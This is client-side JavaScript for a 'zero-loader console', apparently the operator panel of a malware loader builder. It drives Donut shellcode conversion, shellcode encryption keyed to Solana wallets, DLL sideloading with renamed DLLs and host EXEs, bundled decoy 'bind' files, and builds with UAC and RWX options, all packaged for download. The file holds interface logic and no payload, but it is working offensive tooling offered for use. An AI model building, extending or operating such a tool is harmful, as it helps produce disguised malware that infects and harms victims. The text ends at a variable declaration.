/* zero-loader console — client logic */

const $  = (sel, root = document) => root.querySelector(sel);
const $$ = (sel, root = document) => Array.from(root.querySelectorAll(sel));

// ─── utilities ────────────────────────────────────────────────────────────

function fmtSize(n) {
  if (!n) return "0 B";
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / 1024 / 1024).toFixed(2)} MB`;
}
function fmtTime(sec) {
  return new Date(sec * 1000).toLocaleString();
}
function fmtTimeShort(sec) {
  const d = new Date(sec * 1000);
  return d.toLocaleDateString([], {month:"short", day:"numeric"}) + " " +
         d.toLocaleTimeString([], {hour:"2-digit", minute:"2-digit"});
}
function trunc(s, n = 20) {
  return s && s.length > n ? s.slice(0, n) + "…" : (s || "");
}
function writeConsole(el, line, { ok = null, reset = false } = {}) {
  if (reset) el.textContent = "";
  el.textContent += line;
  el.scrollTop = el.scrollHeight;
  el.classList.remove("ok", "bad");
  if (ok === true)  el.classList.add("ok");
  if (ok === false) el.classList.add("bad");
}

// ─── page switching ────────────────────────────────────────────────────────

$$(".page-btn").forEach(btn => {
  btn.addEventListener("click", () => {
    $$(".page-btn").forEach(b => b.classList.toggle("active", b === btn));
    const target = btn.dataset.page;
    $$(".page").forEach(p => p.classList.toggle("active", p.id === `page-${target}`));
    if (target === "donut")    refreshDonutJobs();
    if (target === "solana")   refreshWallets();
    if (target === "sideload") refreshSideloadAssets();
    if (target === "build")  { refreshStatus(); refreshEncryptDropdowns(); refreshSideloadSelectors(); refreshEncryptHistory(); refreshBuildHistory(); refreshPayloadSelector(); }
  });
});

// ─── inner tab switching (Build page) ─────────────────────────────────────

$$(".tab").forEach(btn => {
  btn.addEventListener("click", () => {
    $$(".tab").forEach(t => t.classList.toggle("active", t === btn));
    const target = btn.dataset.tab;
    $$(".panel").forEach(p => p.classList.toggle("active", p.id === `panel-${target}`));
    if (target === "encrypt") refreshEncryptHistory();
    if (target === "build")   refreshBuildHistory();
  });
});

// ─── status pills ─────────────────────────────────────────────────────────

async function refreshStatus() {
  try {
    const j = await fetch("/api/status").then(r => r.json());
    const pp = $("#pill-payload");
    pp.textContent = j.payload_h ? "Payload.h ✓" : "Payload.h —";
    pp.classList.toggle("ok",  !!j.payload_h);
    pp.classList.toggle("bad", !j.payload_h);
    const ps = $("#pill-sideload");
    ps.textContent = j.sideload_h ? "Sideload.h ✓" : "Sideload.h —";
    ps.classList.toggle("ok",  !!j.sideload_h);
    ps.classList.toggle("bad", !j.sideload_h);
  } catch (_) {}
}

// ─── artifacts ────────────────────────────────────────────────────────────

function refreshArtifacts() {
  const list = $("#artifact-list");
  list.innerHTML = "";
  if (!_buildHistory.length) {
    list.innerHTML = "<p class='empty-note'>No builds yet.</p>";
    return;
  }
  for (const j of _buildHistory.slice(0, 10)) {
    const li = document.createElement("li");
    li.className = "artifact";
    const dot    = j.ok ? "●" : "○";
    const dotCls = j.ok ? "dot-ok" : "dot-bad";
    const sz     = j.zip_size > 0 ? j.zip_size : (j.binary_size || 0);
    let dlLink = "";
    if (j.zip_size > 0)
      dlLink = `<a class="dl" href="/api/build/history/${j.id}/download/zip">↓ zip</a>`;
    else if (j.binary_size > 0)
      dlLink = `<a class="dl" href="/api/build/history/${j.id}/download/binary">↓ bin</a>`;
    li.innerHTML = `
      <div class="name">
        <span class="ji-dot ${dotCls}">${dot}</span>
        <span>${j.zip_name || j.binary_name || "—"}</span>
        ${dlLink}
      </div>
      <div class="meta">${j.mode} · ${fmtSize(sz)} · ${fmtTimeShort(j.created_at)}</div>`;
    list.appendChild(li);
  }
}
$("#btn-refresh-arts").addEventListener("click", () => { refreshBuildHistory(); });


// ─── custom dropdown (CDD) ───────────────────────────────────────────────────

let _cddValidIds = new Set();  // tracks valid donut job ids for profile restore

function _cddClose() {
  $$(".cdd.open").forEach(w => {
    w.classList.remove("open");
    w.querySelector(".cdd-list")?.classList.add("hidden");
  });
}
document.addEventListener("click", _cddClose);

function _cddSetDisplay(wrap, html) {
  const d = wrap.querySelector(".cdd-display");
  if (d) d.innerHTML = html;
}

function cddSetValue(wrapId, hiddenId, value) {
  const wrap   = $(`#${wrapId}`);
  const hidden = $(`#${hiddenId}`);
  if (!wrap || !hidden) return;
  hidden.value = value || "";
  const item = wrap.querySelector(`.cdd-item[data-value="${CSS.escape(value)}"]`);
  if (item) {
    _cddSetDisplay(wrap, item.innerHTML.replace(/<button[^>]*>.*?<\/button>/s, "").trim());
    wrap.querySelectorAll(".cdd-item").forEach(i => i.classList.toggle("cdd-selected", i === item));
  } else {
    _cddSetDisplay(wrap, value ? `#${value.slice(0,6)}…` : "— select a Donut job —");
    wrap.querySelectorAll(".cdd-item").forEach(i => i.classList.remove("cdd-selected"));
  }
}

// ─── encrypt dropdowns ────────────────────────────────────────────────────
// Populates:  #enc-sc-job-wrap / #enc-sc-job  (shellcode from donut workspace)
//             #enc-wallet-sel + #pep-wallet-sel (wallets from solana workspace)

async function refreshEncryptDropdowns() {
  // Donut jobs → custom shellcode dropdown
  try {
    const jobs = await fetch("/api/donut/jobs").then(r => r.json());
    const wrap = $("#enc-sc-job-wrap");
    const list = wrap.querySelector(".cdd-list");
    const prev = $("#enc-sc-job").value;
    list.innerHTML = "";
    _cddValidIds.clear();
    const ok = jobs.filter(j => j.ok);
    if (!ok.length) {
      _cddSetDisplay(wrap, "— no successful Donut jobs yet —");
      $("#enc-sc-job").value = "";
    } else {
      // placeholder row
      const ph = document.createElement("div");
      ph.className = "cdd-item cdd-placeholder";
      ph.textContent = "— select a Donut job —";
      ph.addEventListener("click", () => { cddSetValue("enc-sc-job-wrap", "enc-sc-job", ""); _cddClose(); });
      list.appendChild(ph);

      for (const j of ok) {
        _cddValidIds.add(j.id);
        const item = document.createElement("div");
        item.className = "cdd-item";
        item.dataset.value = j.id;
        const labelHtml = j.label
          ? `<span class="cdd-label-badge">${j.label}</span>`
          : "";
        item.innerHTML = `
          <span class="cdd-item-id">#${j.id.slice(0,6)}</span>
          ${labelHtml}
          <span class="cdd-item-name">${j.original_name}</span>
          <span class="cdd-item-meta">${fmtSize(j.size_out)} · ${j.arch_label}</span>`;
        item.addEventListener("click", () => {
          cddSetValue("enc-sc-job-wrap", "enc-sc-job", j.id);
          _cddClose();
        });
        if (j.id === prev) item.classList.add("cdd-selected");
        list.appendChild(item);
      }
      if (!prev || !_cddValidIds.has(prev)) {
        _cddSetDisplay(wrap, "— select a Donut job —");
        $("#enc-sc-job").value = "";
      } else {
        cddSetValue("enc-sc-job-wrap", "enc-sc-job", prev);
      }
    }

    // wire trigger open/close
    const trigger = wrap.querySelector(".cdd-trigger");
    trigger.onclick = (e) => {
      e.stopPropagation();
      const isOpen = wrap.classList.contains("open");
      _cddClose();
      if (!isOpen) {
        wrap.classList.add("open");
        wrap.querySelector(".cdd-list").classList.remove("hidden");
      }
    };
  } catch (_) {}

  // Wallets → encrypt wallet selector
  try {
    const wallets = await fetch("/api/wallets").then(r => r.json());
    const wrap    = $("#enc-wallet-sel-wrap");
    const hidden  = $("#enc-wallet-sel");
    const list    = wrap.querySelector(".cdd-list");
    const prev    = hidden.value;
    list.innerHTML = "";

    const ph = document.createElement("div");
    ph.className = "cdd-item cdd-placeholder";
    ph.textContent = "— select from Solana workspace —";
    ph.addEventListener("click", () => { hidden.value = ""; $("#enc-wallet").value = "";
      _cddSetDisplay(wrap, "— select from Solana workspace —");
      wrap.querySelectorAll(".cdd-item").forEach(i => i.classList.remove("cdd-selected"));
      _cddClose(); });
    list.appendChild(ph);

    for (const w of wallets) {
      const item = document.createElement("div");
      item.className = "cdd-item";
      item.dataset.value = w.id;
      item.dataset.addr  = w.address;
      item.innerHTML = `
        <span class="cdd-label-badge">${w.name}</span>
        <span class="cdd-item-name">${trunc(w.address, 22)}</span>`;
      item.addEventListener("click", () => {
        hidden.value = w.id;
        $("#enc-wallet").value = w.address;
        _cddSetDisplay(wrap, item.innerHTML);
        wrap.querySelectorAll(".cdd-item").forEach(i => i.classList.toggle("cdd-selected", i === item));
        _cddClose();
      });
      if (w.id === prev) item.classList.add("cdd-selected");
      list.appendChild(item);
    }

    if (!prev || !wallets.find(w => w.id === prev)) {
      _cddSetDisplay(wrap, "— select from Solana workspace —");
      hidden.value = "";
    }

    const trigger = wrap.querySelector(".cdd-trigger");
    trigger.onclick = (e) => {
      e.stopPropagation();
      const isOpen = wrap.classList.contains("open");
      _cddClose();
      if (!isOpen) { wrap.classList.add("open"); list.classList.remove("hidden"); }
    };
  } catch (_) {}
}

// Shellcode source toggle
$$("input[name=sc_src]").forEach(r => r.addEventListener("change", syncScSource));
function syncScSource() {
  const mode = $("input[name=sc_src]:checked")?.value;
  $("#enc-sc-job-wrap").style.display = mode === "workspace" ? "" : "none";
  $("#enc-sc-file").style.display     = mode === "upload"    ? "" : "none";
}
syncScSource();

// ─── encrypt ──────────────────────────────────────────────────────────────

$("#form-encrypt").addEventListener("submit", async (e) => {
  e.preventDefault();
  const out = $("#out-encrypt");
  writeConsole(out, "> running Encrypt.py …\n", { reset: true });

  const form = e.target;
  const fd   = new FormData();

  // Wallet: prefer wallet_id from custom dropdown, fall back to text
  const walletId = $("#enc-wallet-sel")?.value || "";
  if (walletId) {
    fd.append("wallet_id", walletId);
  } else {
    const addr = form.sol_wallet?.value?.trim() || "";
    if (addr) fd.append("sol_wallet", addr);
  }

  // Shellcode source
  const scMode = $("input[name=sc_src]:checked")?.value;
  if (scMode === "workspace") {
    const jobId = $("#enc-sc-job").value;
    if (jobId) fd.append("shellcode_job_id", jobId);
  } else {
    const file = $("#enc-sc-file").files[0];
    if (file) fd.append("shellcode", file);
  }

  try {
    const r = await fetch("/api/encrypt", { method: "POST", body: fd });
    const j = await r.json();
    if (j.stdout) writeConsole(out, j.stdout);
    if (j.stderr) writeConsole(out, j.stderr);
    writeConsole(out, `\n[exit ${j.code ?? (j.ok ? 0 : -1)}]\n`, { ok: j.ok });
    if (j.payload_preview) $("#preview-payload").textContent = j.payload_preview;
  } catch (err) { writeConsole(out, `[network error] ${err}\n`, { ok: false }); }
  refreshStatus();
  refreshEncryptHistory();
  refreshPayloadSelector();
});


// ─── sideload workspace (DLL + EXE management) ────────────────────────────

let _dlls  = [];
let _exes  = [];
let _binds = [];

async function refreshSideloadAssets() {
  await Promise.all([refreshDlls(), refreshExes(), refreshBinds()]);
}

// ── DLLs ──────────────────────────────────────────────────────────────────

async function refreshDlls() {
  try { _dlls = await fetch("/api/dlls").then(r => r.json()); }
  catch (_) { _dlls = []; }
  renderDlls();
  refreshSideloadSelectors();
}

function renderDlls() {
  const list  = $("#dll-list");
  const empty = $("#dll-empty");
  list.querySelectorAll(".sl-asset-item").forEach(el => el.remove());
  if (!_dlls.length) { empty.style.display = ""; return; }
  empty.style.display = "none";
  for (const d of _dlls) {
    const el = document.createElement("div");
    el.className = "sl-asset-item";
    const selDllId = $("#sl-dll-sel")?.value;
    const active = selDllId === d.id ? " selected" : "";
    el.innerHTML = `
      <div class="sai-info${active}">
        <span class="sai-name">${d.name}</span>
        <span class="sai-meta">#${d.id} · ${fmtSize(d.size)} · ${fmtTimeShort(d.created_at)}</span>
      </div>
      <div class="sai-btns">
        <button class="btn-xs primary" data-select-dll="${d.id}" title="Select for build">Use</button>
        <button class="btn-xs btn-danger" data-del-dll="${d.id}" title="Delete">✕</button>
      </div>`;
    list.appendChild(el);
    el.querySelector(`[data-select-dll]`).addEventListener("click", () => selectDll(d.id));
    el.querySelector(`[data-del-dll]`).addEventListener("click", () => deleteDll(d.id));
  }
}

function selectDll(id) {
  const sel = $("#sl-dll-sel");
  if (sel) sel.value = id;
  renderDlls(); // refresh "active" highlight
}

async function deleteDll(id) {
  if (!confirm("Delete this DLL from workspace?")) return;
  await fetch(`/api/dlls/${id}`, { method: "DELETE" });
  refreshDlls();
}

$("#sl-dll-upload").addEventListener("change", async (e) => {
  const file = e.target.files[0];
  if (!file) return;
  const fd = new FormData();
  fd.append("dll", file);
  const btn = $("label[for=sl-dll-upload]");
  const orig = btn.textContent;
  btn.textContent = "Uploading…";
  try {
    const r = await fetch("/api/dlls", { method: "POST", body: fd });
    const j = await r.json();
    if (j.ok) { await refreshDlls(); selectDll(j.dll.id); }
    else alert("Upload failed: " + (j.stderr || "unknown error"));
  } catch (err) { alert("Upload error: " + err); }
  finally { btn.textContent = orig; e.target.value = ""; }
});

// ── EXEs ──────────────────────────────────────────────────────────────────

async function refreshExes() {
  try { _exes = await fetch("/api/exes").then(r => r.json()); }
  catch (_) { _exes = []; }
  renderExes();
  refreshSideloadSelectors();
}

function renderExes() {
  const list  = $("#exe-list");
  const empty = $("#exe-empty");
  list.querySelectorAll(".sl-asset-item").forEach(el => el.remove());
  if (!_exes.length) { empty.style.display = ""; return; }
  empty.style.display = "none";
  for (const x of _exes) {
    const el = document.createElement("div");
    el.className = "sl-asset-item";
    const selExeId = $("#sl-exe-sel")?.value;
    const active = selExeId === x.id ? " selected" : "";
    el.innerHTML = `
      <div class="sai-info${active}">
        <span class="sai-name">${x.name}</span>
        <span class="sai-meta">#${x.id} · ${fmtSize(x.size)} · ${fmtTimeShort(x.created_at)}</span>
      </div>
      <div class="sai-btns">
        <button class="btn-xs primary" data-select-exe="${x.id}" title="Select for build">Use</button>
        <button class="btn-xs btn-danger" data-del-exe="${x.id}" title="Delete">✕</button>
      </div>`;
    list.appendChild(el);
    el.querySelector(`[data-select-exe]`).addEventListener("click", () => selectExe(x.id));
    el.querySelector(`[data-del-exe]`).addEventListener("click", () => deleteExe(x.id));
  }
}

function selectExe(id) {
  const sel = $("#sl-exe-sel");
  if (sel) sel.value = id;
  renderExes();
}

async function deleteExe(id) {
  if (!confirm("Delete this EXE from workspace?")) return;
  await fetch(`/api/exes/${id}`, { method: "DELETE" });
  refreshExes();
}

$("#sl-exe-upload").addEventListener("change", async (e) => {
  const file = e.target.files[0];
  if (!file) return;
  const fd = new FormData();
  fd.append("exe", file);
  const btn = $("label[for=sl-exe-upload]");
  const orig = btn.textContent;
  btn.textContent = "Uploading…";
  try {
    const r = await fetch("/api/exes", { method: "POST", body: fd });
    const j = await r.json();
    if (j.ok) { await refreshExes(); selectExe(j.exe.id); }
    else alert("Upload failed: " + (j.stderr || "unknown error"));
  } catch (err) { alert("Upload error: " + err); }
  finally { btn.textContent = orig; e.target.value = ""; }
});

// ── Bind files ────────────────────────────────────────────────────────────

async function refreshBinds() {
  try { _binds = await fetch("/api/binds").then(r => r.json()); }
  catch (_) { _binds = []; }
  renderBinds();
  refreshSideloadSelectors();
}

function renderBinds() {
  const list  = $("#bind-list");
  const empty = $("#bind-empty");
  list.querySelectorAll(".sl-asset-item").forEach(el => el.remove());
  if (!_binds.length) { empty.style.display = ""; return; }
  empty.style.display = "none";
  for (const b of _binds) {
    const el = document.createElement("div");
    el.className = "sl-asset-item";
    const selBindId = $("#sl-bind-sel")?.value;
    const active = selBindId === b.id ? " selected" : "";
    el.innerHTML = `
      <div class="sai-info${active}">
        <span class="sai-name">${b.name}</span>
        <span class="sai-meta">#${b.id} · ${fmtSize(b.size)} · ${fmtTimeShort(b.created_at)}</span>
      </div>
      <div class="sai-btns">
        <a class="btn-xs" href="/api/binds/${b.id}/download" title="Download">↓</a>
        <button class="btn-xs primary" data-select-bind="${b.id}" title="Select for build">Use</button>
        <button class="btn-xs btn-danger" data-del-bind="${b.id}" title="Delete">✕</button>
      </div>`;
    list.appendChild(el);
    el.querySelector(`[data-select-bind]`).addEventListener("click", () => selectBind(b.id));
    el.querySelector(`[data-del-bind]`).addEventListener("click", () => deleteBind(b.id));
  }
}

function selectBind(id) {
  const sel = $("#sl-bind-sel");
  if (sel) sel.value = id;
  renderBinds();
}

async function deleteBind(id) {
  if (!confirm("Delete this bind file from workspace?")) return;
  await fetch(`/api/binds/${id}`, { method: "DELETE" });
  refreshBinds();
}

$("#sl-bind-upload").addEventListener("change", async (e) => {
  const file = e.target.files[0];
  if (!file) return;
  const fd = new FormData();
  fd.append("bind", file);
  const btn = $("label[for=sl-bind-upload]");
  const orig = btn.textContent;
  btn.textContent = "Uploading…";
  try {
    const r = await fetch("/api/binds", { method: "POST", body: fd });
    const j = await r.json();
    if (j.ok) { await refreshBinds(); selectBind(j.bind.id); }
    else alert("Upload failed: " + (j.stderr || "unknown error"));
  } catch (err) { alert("Upload error: " + err); }
  finally { btn.textContent = orig; e.target.value = ""; }
});

// ── sideload dropdowns (in Build tab) ────────────────────────────────────

function refreshSideloadSelectors() {
  const dllSel  = $("#sl-dll-sel");
  const exeSel  = $("#sl-exe-sel");
  const bindSel = $("#sl-bind-sel");
  if (!dllSel || !exeSel) return;

  const prevDll  = dllSel.value;
  const prevExe  = exeSel.value;
  const prevBind = bindSel ? bindSel.value : "";

  dllSel.innerHTML = _dlls.length
    ? `<option value="">— select DLL —</option>` + _dlls.map(d =>
        `<option value="${d.id}">${d.name}  (#${d.id} · ${fmtSize(d.size)})</option>`).join("")
    : `<option value="">— no DLLs in workspace yet —</option>`;
  if (prevDll && [...dllSel.options].some(o => o.value === prevDll)) dllSel.value = prevDll;

  exeSel.innerHTML = _exes.length
    ? `<option value="">— select EXE —</option>` + _exes.map(x =>
        `<option value="${x.id}">${x.name}  (#${x.id} · ${fmtSize(x.size)})</option>`).join("")
    : `<option value="">— no EXEs in workspace yet —</option>`;
  if (prevExe && [...exeSel.options].some(o => o.value === prevExe)) exeSel.value = prevExe;

  if (bindSel) {
    bindSel.innerHTML = `<option value="">— none —</option>` + _binds.map(b =>
      `<option value="${b.id}">${b.name}  (#${b.id} · ${fmtSize(b.size)})</option>`).join("");
    if (prevBind && [...bindSel.options].some(o => o.value === prevBind)) bindSel.value = prevBind;
  }

}


// ─── build ────────────────────────────────────────────────────────────────

function syncBuildMode() {
  const mode = $("input[name=mode]:checked", $("#form-build"))?.value;
  $("#field-sideload-config")?.classList.toggle("hidden", mode !== "sideload");
}
$$("input[name=mode]").forEach(r => r.addEventListener("change", () => {
  syncBuildMode();
  // Persist the chosen mode so it survives page reloads
  try { localStorage.setItem("zeroBuildMode", r.value); } catch (_) {}
}));
// Restore last-used mode on boot (before first syncBuildMode call)
try {
  const _savedMode = localStorage.getItem("zeroBuildMode");
  if (_savedMode) {
    const _modeEl = $(`input[name=mode][value="${_savedMode}"]`, $("#form-build"));
    if (_modeEl) _modeEl.checked = true;
  }
} catch (_) {}
syncBuildMode();

$("#form-build").addEventListener("submit", async (e) => {
  e.preventDefault();
  const out = $("#out-build"), form = e.target;
  out.textContent = ""; out.classList.remove("ok", "bad");

  const mode = $("input[name=mode]:checked", form)?.value;
  const body = {
    mode,
    uac:                form.uac.checked,
    rwx:                form.rwx.checked,
    debug:              form.debug.checked,
    synthetic:          form.synthetic.checked,
    encrypt_history_id: $("#bld-payload-sel")?.value       || "",
    dll_id:             $("#sl-dll-sel")?.value            || "",
    exe_id:             $("#sl-exe-sel")?.value            || "",
    sideload_rename:    $("#sl-dll-rename")?.value.trim()  || "",
    host_rename:        $("#sl-host-rename")?.value.trim() || "",
    zip_name:           $("#sl-zip-name")?.value.trim()    || "",
    bind_id:            $("#sl-bind-sel")?.value           || "",
    bind_rename:        $("#sl-bind-rename")?.value.trim() || "",
  };

  const btn = $("button.primary", form);
  btn.disabled = true; btn.textContent = "Building…";
  try {
    const r = await fetch("/api/build", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    const reader = r.body.getReader(), decoder = new TextDecoder();
    let buf = "";
    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      buf = decoder.decode(value, { stream: true });
      writeConsole(out, buf);
    }
    const last = out.textContent.trim().split("\n").at(-1);
    const m = last?.match(/\[exit (-?\d+)\]/);
    if (m) { out.classList.toggle("ok", m[1] === "0"); out.classList.toggle("bad", m[1] !== "0"); }
  } catch (err) { writeConsole(out, `[network error] ${err}\n`, { ok: false }); }
  finally { btn.disabled = false; btn.textContent = "Build"; refreshStatus(); refreshBuildHistory(); }
});

// ─── profiles ─────────────────────────────────────────────────────────────

// ─── profiles ─────────────────────────────────────────────────────────────

let _encProfiles = [];
let _bldProfiles = [];
let _curEncProfileId = null, _curEncProfileName = "";
let _curBldProfileId = null, _curBldProfileName = "";

async function refreshEncProfiles() {
  try { _encProfiles = await fetch("/api/profiles/encrypt").then(r => r.json()); }
  catch (_) { _encProfiles = []; }
  renderEncProfiles();
}

async function refreshBldProfiles() {
  try { _bldProfiles = await fetch("/api/profiles/build").then(r => r.json()); }
  catch (_) { _bldProfiles = []; }
  renderBldProfiles();
}

function _renderProfileList(profiles, listEl, emptyEl, loadFn, delFn) {
  listEl.innerHTML = "";
  if (!profiles.length) { emptyEl.classList.remove("hidden"); return; }
  emptyEl.classList.add("hidden");
  for (const p of profiles) {
    const li = document.createElement("li");
    li.className = "mgmt-item";
    li.innerHTML = `
      <div class="mi-info">
        <div class="mi-name">${p.name}</div>
        <div class="mi-meta" style="font-size:10px;color:var(--text-mute)">${_profileMeta(p)}</div>
      </div>
      <div class="mi-btns">
        <button class="btn-sm primary" data-load="${p.id}">Load</button>
        <button class="btn-sm btn-danger" data-del="${p.id}">✕</button>
      </div>`;
    listEl.appendChild(li);
  }
  listEl.querySelectorAll("[data-load]").forEach(b => b.addEventListener("click", () => loadFn(b.dataset.load)));
  listEl.querySelectorAll("[data-del]").forEach(b => b.addEventListener("click", () => delFn(b.dataset.del)));
}

function _profileMeta(p) {
  if (p.type === "build" || (!p.type && p.mode)) {
    const flags = [p.mode||"exe", p.uac?"uac":"", p.rwx?"rwx":"", p.debug?"dbg":""].filter(Boolean).join(" · ");
    return flags + (p.encrypt_history_id ? ` · enc:#${p.encrypt_history_id.slice(0,6)}` : "");
  }
  return (p.sol_wallet ? trunc(p.sol_wallet, 22) : "—");
}

function renderEncProfiles() {
  _renderProfileList(_encProfiles, $("#enc-profile-list"), $("#enc-profile-empty"),
    loadEncProfile, deleteEncProfile);
}
function renderBldProfiles() {
  _renderProfileList(_bldProfiles, $("#bld-profile-list"), $("#bld-profile-empty"),
    loadBldProfile, deleteBldProfile);
}

function loadEncProfile(id) {
  const p = _encProfiles.find(x => x.id === id);
  if (!p) return;
  _curEncProfileId = id; _curEncProfileName = p.name;
  $("#btn-show-save-enc-profile").textContent = `↺ ${p.name}`;
  $("#enc-wallet").value = p.sol_wallet || "";
  if (p.shellcode_job_id && _cddValidIds.has(p.shellcode_job_id)) {
    cddSetValue("enc-sc-job-wrap", "enc-sc-job", p.shellcode_job_id);
    const r = $("input[name=sc_src][value=workspace]");
    if (r) { r.checked = true; syncScSource(); }
  }
  $$(".tab").forEach(t => t.classList.toggle("active", t.dataset.tab === "encrypt"));
  $$(".panel").forEach(pp => pp.classList.toggle("active", pp.id === "panel-encrypt"));
  _openEncSaveRow();
}

function loadBldProfile(id) {
  const p = _bldProfiles.find(x => x.id === id);
  if (!p) return;
  _curBldProfileId = id; _curBldProfileName = p.name;
  $("#btn-show-save-bld-profile").textContent = `↺ ${p.name}`;
  const modeEl = $(`#form-build input[name=mode][value="${p.mode || "exe"}"]`);
  if (modeEl) { modeEl.checked = true; try { localStorage.setItem("zeroBuildMode", p.mode||"exe"); } catch(_){} }
  $("#bld-uac").checked   = !!p.uac;
  $("#bld-rwx").checked   = !!p.rwx;
  $("#bld-debug").checked = !!p.debug;
  $("#bld-syn").checked   = !!p.synthetic;
  const dllSel = $("#sl-dll-sel");
  if (dllSel && p.dll_id) { dllSel.value = p.dll_id; if (dllSel.value !== p.dll_id) dllSel.value = ""; }
  const exeSel = $("#sl-exe-sel");
  if (exeSel && p.exe_id) { exeSel.value = p.exe_id; if (exeSel.value !== p.exe_id) exeSel.value = ""; }
  if ($("#sl-dll-rename"))  $("#sl-dll-rename").value  = p.sideload_rename || "";
  if ($("#sl-host-rename")) $("#sl-host-rename").value = p.host_rename     || "";
  if ($("#sl-zip-name"))    $("#sl-zip-name").value    = p.zip_name        || "";
  const bindSel = $("#sl-bind-sel");
  if (bindSel && p.bind_id) { bindSel.value = p.bind_id; if (bindSel.value !== p.bind_id) bindSel.value = ""; }
  if ($("#sl-bind-rename")) $("#sl-bind-rename").value = p.bind_rename || "";
  // Payload.h selector — set hidden value then let refreshPayloadSelector sync CDD display
  const payloadSel = $("#bld-payload-sel");
  if (payloadSel) payloadSel.value = p.encrypt_history_id || "";
  refreshPayloadSelector();
  syncBuildMode();
  $$(".tab").forEach(t => t.classList.toggle("active", t.dataset.tab === "build"));
  $$(".panel").forEach(pp => pp.classList.toggle("active", pp.id === "panel-build"));
  _openBldSaveRow();
}

async function deleteEncProfile(id) {
  if (!confirm("Delete this encrypt profile?")) return;
  await fetch(`/api/profiles/${id}`, { method: "DELETE" });
  if (_curEncProfileId === id) { _curEncProfileId = null; _curEncProfileName = ""; $("#btn-show-save-enc-profile").textContent = "Save"; }
  refreshEncProfiles();
}
async function deleteBldProfile(id) {
  if (!confirm("Delete this build profile?")) return;
  await fetch(`/api/profiles/${id}`, { method: "DELETE" });
  if (_curBldProfileId === id) { _curBldProfileId = null; _curBldProfileName = ""; $("#btn-show-save-bld-profile").textContent = "Save"; }
  refreshBldProfiles();
}

function collectEncryptData() {
  return {
    sol_wallet:       $("#enc-wallet")?.value || "",
    shellcode_job_id: $("#enc-sc-job")?.value || "",
  };
}
function collectBuildData() {
  return {
    encrypt_history_id: $("#bld-payload-sel")?.value       || "",
    dll_id:             $("#sl-dll-sel")?.value            || "",
    exe_id:             $("#sl-exe-sel")?.value            || "",
    sideload_rename:    $("#sl-dll-rename")?.value.trim()  || "",
    host_rename:        $("#sl-host-rename")?.value.trim() || "",
    zip_name:           $("#sl-zip-name")?.value.trim()    || "",
    bind_id:            $("#sl-bind-sel")?.value           || "",
    bind_rename:        $("#sl-bind-rename")?.value.trim() || "",
    mode:               $("input[name=mode]:checked")?.value || "exe",
    uac:                $("#bld-uac")?.checked   || false,
    rwx:                $("#bld-rwx")?.checked   || false,
    debug:              $("#bld-debug")?.checked || false,
    synthetic:          $("#bld-syn")?.checked   || false,
  };
}

// ── save row helpers ───────────────────────────────────────────────────────

function _makeSaveRow(rowId, nameId, confirmId, cancelId, saveasId,
                      getCurId, getCurName, setCurId, setCurName,
                      apiBase, refreshFn, btnId) {
  const row     = $(`#${rowId}`);
  const nameEl  = $(`#${nameId}`);
  const confBtn = $(`#${confirmId}`);
  const canBtn  = $(`#${cancelId}`);
  const saLink  = $(`#${saveasId}`);
  const showBtn = $(`#${btnId}`);

  function close() { row.classList.add("hidden"); nameEl.value = ""; }
  function open(forceNew = false) {
    const cid = getCurId();
    if (!forceNew && cid) {
      nameEl.value = getCurName(); confBtn.textContent = "Update"; saLink.classList.remove("hidden");
    } else {
      nameEl.value = ""; confBtn.textContent = "Save"; saLink.classList.add("hidden");
    }
    row.classList.remove("hidden"); nameEl.focus(); nameEl.select();
  }

  showBtn.addEventListener("click", () => open());
  canBtn.addEventListener("click", close);
  saLink.addEventListener("click", e => { e.preventDefault(); setCurId(null); setCurName(""); open(true); });

  return { open, close };
}

// ── Encrypt save row ──────────────────────────────────────────────────────

const _encSaveRow = _makeSaveRow(
  "enc-profile-save-row", "enc-profile-name-input",
  "btn-confirm-save-enc-profile", "btn-cancel-save-enc-profile", "btn-enc-saveas-new",
  () => _curEncProfileId, () => _curEncProfileName,
  v => { _curEncProfileId = v; }, v => { _curEncProfileName = v; },
  "/api/profiles/encrypt", () => refreshEncProfiles(), "btn-show-save-enc-profile"
);
function _openEncSaveRow(forceNew) { _encSaveRow.open(forceNew); }

$("#btn-confirm-save-enc-profile").addEventListener("click", async () => {
  const name = $("#enc-profile-name-input").value.trim();
  if (!name) { $("#enc-profile-name-input").focus(); return; }
  const body = { name, ...collectEncryptData() };
  if (_curEncProfileId) {
    await fetch(`/api/profiles/${_curEncProfileId}`, { method:"PUT", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body) });
    _curEncProfileName = name;
    $("#btn-show-save-enc-profile").textContent = `↺ ${name}`;
  } else {
    const j = await fetch("/api/profiles/encrypt", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body) }).then(r=>r.json()).catch(()=>({}));
    if (j.profile) { _curEncProfileId = j.profile.id; _curEncProfileName = j.profile.name; $("#btn-show-save-enc-profile").textContent = `↺ ${j.profile.name}`; }
  }
  _encSaveRow.close();
  refreshEncProfiles();
});

// ── Build save row ────────────────────────────────────────────────────────

const _bldSaveRow = _makeSaveRow(
  "bld-profile-save-row", "bld-profile-name-input",
  "btn-confirm-save-bld-profile", "btn-cancel-save-bld-profile", "btn-bld-saveas-new",
  () => _curBldProfileId, () => _curBldProfileName,
  v => { _curBldProfileId = v; }, v => { _curBldProfileName = v; },
  "/api/profiles/build", () => refreshBldProfiles(), "btn-show-save-bld-profile"
);
function _openBldSaveRow(forceNew) { _bldSaveRow.open(forceNew); }

$("#btn-confirm-save-bld-profile").addEventListener("click", async () => {
  const name = $("#bld-profile-name-input").value.trim();
  if (!name) { $("#bld-profile-name-input").focus(); return; }
  const body = { name, ...collectBuildData() };
  if (_curBldProfileId) {
    await fetch(`/api/profiles/${_curBldProfileId}`, { method:"PUT", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body) });
    _curBldProfileName = name;
    $("#btn-show-save-bld-profile").textContent = `↺ ${name}`;
  } else {
    const j = await fetch("/api/profiles/build", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body) }).then(r=>r.json()).catch(()=>({}));
    if (j.profile) { _curBldProfileId = j.profile.id; _curBldProfileName = j.profile.name; $("#btn-show-save-bld-profile").textContent = `↺ ${j.profile.name}`; }
  }
  _bldSaveRow.close();
  refreshBldProfiles();
});

// ─── encrypt history ─────────────────────────────────────────────────────

let _encryptHistory = [];

